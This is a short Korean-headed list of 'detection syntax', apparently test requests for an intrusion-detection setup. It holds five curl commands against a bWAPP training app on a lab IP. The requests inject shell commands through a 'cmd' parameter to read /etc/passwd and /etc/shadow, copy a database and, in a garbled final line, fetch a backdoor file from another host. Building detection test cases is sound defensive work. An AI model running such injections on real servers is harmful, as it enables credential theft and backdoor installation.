## 탐지 구문 ##
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?cmd=/bin|%20cat%20/etc/passwd"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?cmd=/bin|%20cat%20/etc/hosts"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?cmd=/bin|%20cat%20/etc/shadow"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?cmd=/bin|%20cp%20/db/to/mysql%20/here"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?cmd=/bin|%20cat%20/wget%20192.168.1.212/bacdoor.php"

